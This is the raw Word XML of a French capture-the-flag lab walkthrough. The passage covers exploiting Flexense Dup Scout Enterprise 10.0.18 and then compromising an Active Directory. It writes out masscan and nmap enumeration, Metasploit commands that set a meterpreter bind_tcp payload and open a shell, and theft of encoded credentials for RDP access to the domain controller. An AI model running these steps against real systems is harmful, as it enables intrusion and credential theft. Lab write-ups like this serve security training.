      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> par HTTP POST de la page de login de l’interface web du </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Dup</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Scout Entreprise 10.0.18 (x86) vulnérable de </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Flexense</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>, sur Windows 10 1909 (x64)</w:t>
      </w:r>
      <w:r w:rsidR="00CC1DD8">
        <w:t xml:space="preserve"> avec auto-logon et exécution au démarrage</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D95F68C" w14:textId="64378D0D" w:rsidR="004C2A12" w:rsidRPr="004C2A12" w:rsidRDefault="004C2A12" w:rsidP="00CC1DD8">
      <w:pPr>
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004C2A12">
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Procédure :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="689101FF" w14:textId="3658893F" w:rsidR="00A16810" w:rsidRDefault="00A16810" w:rsidP="00CC1DD8">
      <w:r>
        <w:t>Enumération des hôtes sur le réseau « 192.168.</w:t>
      </w:r>
      <w:r w:rsidR="001162EE">
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>0.</w:t>
      </w:r>
      <w:r w:rsidR="00DE36F6">
        <w:t>0/24</w:t>
      </w:r>
      <w:r>
        <w:t> » :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B9ABED" w14:textId="61E230AA" w:rsidR="00A16810" w:rsidRDefault="00A16810" w:rsidP="00CC1DD8">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00E15BB1">
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>asscan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 192.</w:t>
      </w:r>
      <w:r w:rsidR="00E15BB1">
        <w:t>168.10.0/24 -p</w:t>
      </w:r>
      <w:r w:rsidR="00DB2675">
        <w:t>21,22,80,88,443,445,3306,3389</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38053358" w14:textId="7DF07FAB" w:rsidR="007D6815" w:rsidRDefault="00DB2675" w:rsidP="004C2A12">
      <w:r w:rsidRPr="00DB2675">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="60B04D67" wp14:editId="2FCBB4E1">
            <wp:extent cx="6506483" cy="3010320"/>
            <wp:effectExtent l="0" t="0" r="8890" b="0"/>
            <wp:docPr id="147202040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2040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AE40" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="0883C5DA" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="2C08EDCD" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="6C4C67FC" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="4D695AF2" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="7D6FFA26" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="66D7E5DA" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="3E2DC34F" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="338EFCC8" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="63B704FB" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="6056C3F8" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="19A44053" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="5507D9A4" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="7BD18E13" w14:textId="5FFB3BDF" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Enumération de ports :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3466098F" w14:textId="4E8974BB" w:rsidR="004A04A1" w:rsidRPr="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidRPr="004A04A1">
        <w:t>map</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004A04A1">
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004A04A1">
        <w:t>Pn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004A04A1">
        <w:t xml:space="preserve"> -f -n -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004A04A1">
        <w:t>sV</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004A04A1">
        <w:t xml:space="preserve"> -g 0 -p 21,22,80,88,443,445,3306,3389 192.168.10.23 -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004A04A1">
        <w:t>vv</w:t>
      </w:r>
      <w:r>
        <w:t>v</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4F707F70" w14:textId="2204B708" w:rsidR="00906937" w:rsidRDefault="00504867" w:rsidP="00CC1DD8">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="08309BDD" wp14:editId="12675A6D">
            <wp:extent cx="6638925" cy="5210175"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="161052688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5F826" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00CC1DD8"/>
    <w:p w14:paraId="38FB1FB2" w14:textId="26F31115" w:rsidR="00504867" w:rsidRDefault="00504867" w:rsidP="00CC1DD8">
      <w:r>
        <w:t xml:space="preserve">Mettre le </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> en « background »</w:t>
      </w:r>
      <w:r w:rsidR="00F369AF">
        <w:t> :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="026DDFF9" w14:textId="241BF98A" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00CC1DD8">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> &gt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>bg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5796699A" w14:textId="2737AF79" w:rsidR="00504867" w:rsidRDefault="00504867" w:rsidP="00CC1DD8">
      <w:r>
        <w:t>Rechercher « </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dup_scout</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> » avec la commande</w:t>
      </w:r>
      <w:r w:rsidR="004C2A12">
        <w:t> :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02BD2646" w14:textId="06F87EC6" w:rsidR="004A04A1" w:rsidRPr="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00CC1DD8">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00DE2304">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r w:rsidRPr="004A04A1">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004A04A1">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> exploit(multi/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004A04A1">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>hhtp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004A04A1">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004A04A1">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>phpmailer_arg_injection</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004A04A1">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) &gt; search </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004A04A1">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>dup_s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cout</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="06870408" w14:textId="5316D68C" w:rsidR="00906937" w:rsidRDefault="00504867" w:rsidP="00CC1DD8">
      <w:r w:rsidRPr="00504867">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2E319FD0" wp14:editId="740A26C1">
            <wp:extent cx="6645910" cy="1668145"/>
            <wp:effectExtent l="0" t="0" r="2540" b="8255"/>
            <wp:docPr id="1631426260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26260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CDB5" w14:textId="5307DA53" w:rsidR="00504867" w:rsidRDefault="00504867" w:rsidP="00CC1DD8">
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidR="004A04A1">
        <w:t>électionner l’exploit avec</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> « </w:t>
      </w:r>
      <w:r w:rsidRPr="00DE2304">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>use 0</w:t>
      </w:r>
      <w:r>
        <w:t> ».</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A06F47B" w14:textId="4EB0F627" w:rsidR="00504867" w:rsidRDefault="004A04A1" w:rsidP="00CC1DD8">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Puis voir les options avec </w:t>
      </w:r>
      <w:r w:rsidR="00504867">
        <w:t>« </w:t>
      </w:r>
      <w:r w:rsidRPr="00DE2304">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r w:rsidR="00504867" w:rsidRPr="00DE2304">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ptions</w:t>
      </w:r>
      <w:r w:rsidR="00504867">
        <w:t> » :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="246C5B53" w14:textId="1AB7FFC1" w:rsidR="00504867" w:rsidRDefault="00504867" w:rsidP="00CC1DD8">
      <w:r w:rsidRPr="00504867">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1FDB5B8B" wp14:editId="476A68B4">
            <wp:extent cx="6645910" cy="2440305"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="982093574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3574" name="Image 1" descr="Une image contenant texte, capture d’écran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5358" w14:textId="77777777" w:rsidR="00504867" w:rsidRDefault="00504867" w:rsidP="00504867">
      <w:r w:rsidRPr="004C2A12">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Remarque :</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> le « </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>payload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> » par </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>défault</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> est en « reverse » et non en </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>bind</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> et ne peut pas remonter dans le VPN, il faudra donc le changer (voir ci-dessous).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="470DAFD1" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00504867"/>
    <w:p w14:paraId="5F8D1A80" w14:textId="2F50C5E9" w:rsidR="00504867" w:rsidRPr="00F369AF" w:rsidRDefault="00504867" w:rsidP="00504867">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F369AF">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Saisir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F369AF">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> « </w:t>
      </w:r>
      <w:r w:rsidRPr="008D52B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D52B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>rhosts</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D52B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="004C2A12" w:rsidRPr="008D52B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>192.168.10.23</w:t>
      </w:r>
      <w:r w:rsidR="004A04A1" w:rsidRPr="008D52B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="008D52B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>»</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="144C569E" w14:textId="307A49A2" w:rsidR="00504867" w:rsidRPr="00F369AF" w:rsidRDefault="00504867" w:rsidP="00504867">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F369AF">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Saisir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F369AF">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> « </w:t>
      </w:r>
      <w:r w:rsidRPr="00DE2304">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>set payload windows/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DE2304">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DE2304">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DE2304">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>bind_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004A04A1">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t> »</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3E0986" w14:textId="126991BF" w:rsidR="00906937" w:rsidRDefault="00504867" w:rsidP="00CC1DD8">
      <w:r w:rsidRPr="00504867">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="770906E7" wp14:editId="57072358">
            <wp:extent cx="6645910" cy="2775585"/>
            <wp:effectExtent l="0" t="0" r="2540" b="5715"/>
            <wp:docPr id="399449251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49251" name="Image 1" descr="Une image contenant texte, capture d’écran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C23F" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00CC1DD8"/>
    <w:p w14:paraId="28755210" w14:textId="3B38C450" w:rsidR="00AA7BB4" w:rsidRDefault="00AA7BB4" w:rsidP="00CC1DD8">
      <w:r>
        <w:t>Si ce message apparaît, rebooter la machine W10…</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D34B197" w14:textId="3405FE2D" w:rsidR="00AA7BB4" w:rsidRDefault="002A3638" w:rsidP="00CC1DD8">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="52CC6287" wp14:editId="4629780F">
            <wp:extent cx="6645910" cy="1534795"/>
            <wp:effectExtent l="0" t="0" r="2540" b="8255"/>
            <wp:docPr id="17259047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0471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29BF" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00CC1DD8"/>
    <w:p w14:paraId="0CF10355" w14:textId="5E5D8FB7" w:rsidR="00AA7BB4" w:rsidRDefault="00AA7BB4" w:rsidP="00CC1DD8">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Sinon, </w:t>
      </w:r>
      <w:r w:rsidR="00DE2304">
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r w:rsidR="00793603">
        <w:t>obtient</w:t>
      </w:r>
      <w:r w:rsidR="00DE2304">
        <w:t xml:space="preserve"> la session</w:t>
      </w:r>
      <w:r>
        <w:t> :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73616E8F" w14:textId="2027F2AF" w:rsidR="00AA7BB4" w:rsidRPr="004C2A12" w:rsidRDefault="00AA7BB4" w:rsidP="004C2A12">
      <w:r w:rsidRPr="00AA7BB4">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0313D0C9" wp14:editId="7D21DF6D">
            <wp:extent cx="6645910" cy="1353185"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="157128953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895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46E2" w14:textId="17856431" w:rsidR="009A1FC6" w:rsidRDefault="009A1FC6" w:rsidP="0022133A">
      <w:pPr>
        <w:pStyle w:val="Titre2"/>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc210403958"/>
      <w:r>
        <w:t xml:space="preserve">Etape 3 : </w:t>
      </w:r>
      <w:r w:rsidR="00CC1DD8">
        <w:t>Compromission de l’AD</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:p w14:paraId="5DDDD3EA" w14:textId="7BDB5E14" w:rsidR="004021CD" w:rsidRDefault="00CC1DD8" w:rsidP="00CC1DD8">
      <w:r>
        <w:t>Vol d’identifiants stockés localement sur le post</w:t>
      </w:r>
      <w:r w:rsidR="00AA7BB4">
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> client Windows 10 dans u</w:t>
      </w:r>
      <w:r w:rsidR="00700A50">
        <w:t xml:space="preserve">ne note personnelle </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">encodée en Base64 puis en </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Brainfuck</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> : correspondent au compte admin réseau qui a un droit de connexion distante sur l’AD. L’accès se fait en RDP depuis la Kali virtuellement dans la DMZ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D01A917" w14:textId="21BB6576" w:rsidR="00DE36F6" w:rsidRDefault="00DE36F6" w:rsidP="002A3638">
      <w:r>
        <w:t xml:space="preserve">Passer </w:t>
      </w:r>
      <w:r w:rsidR="00DE2304">
        <w:t xml:space="preserve">le </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00DE2304">
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00DE2304">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>en « </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>shell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> » :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B73D501" w14:textId="380254B5" w:rsidR="00DE36F6" w:rsidRDefault="00DE36F6" w:rsidP="002A3638">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> &gt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>shell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="460C7B2A" w14:textId="1E73227D" w:rsidR="00DE36F6" w:rsidRDefault="00FE6A9B" w:rsidP="002A3638">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE6A9B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D3635F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5C2A1A25" wp14:editId="5639F3AD">
            <wp:extent cx="4220164" cy="1143160"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="9152965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965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ED3C" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="002A3638">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BFD1E43" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="002A3638">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63EB2F59" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="002A3638">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="013C30AE" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="002A3638">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="721926AF" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="002A3638">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4AFAF70F" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="002A3638">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CB6D7CF" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="002A3638">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A8DEF67" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="002A3638">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EA618A6" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="002A3638">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EE4A950" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="002A3638">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3171232D" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="002A3638">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E066646" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="002A3638">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02341E32" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="002A3638">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34DBBF40" w14:textId="18B40767" w:rsidR="00FE6A9B" w:rsidRDefault="00DE36F6" w:rsidP="002A3638">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Trouver le f</w:t>
      </w:r>
      <w:r w:rsidR="00FE6A9B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">lag </w:t>
      </w:r>
      <w:r w:rsidR="00F369AF">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="00FE6A9B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="00DE2304">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">dans « c:\program files (x86)\dup scout enterprise\bin » </w:t>
      </w:r>
      <w:r w:rsidR="00FE6A9B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39E4C54E" w14:textId="75A56E77" w:rsidR="002A3638" w:rsidRDefault="00DE2304" w:rsidP="002A363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B6F317" wp14:editId="6A79CBA8">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1797</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>144623</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3569539" cy="206411"/>
                <wp:effectExtent l="19050" t="19050" r="12065" b="22225"/>
                <wp:wrapNone/>
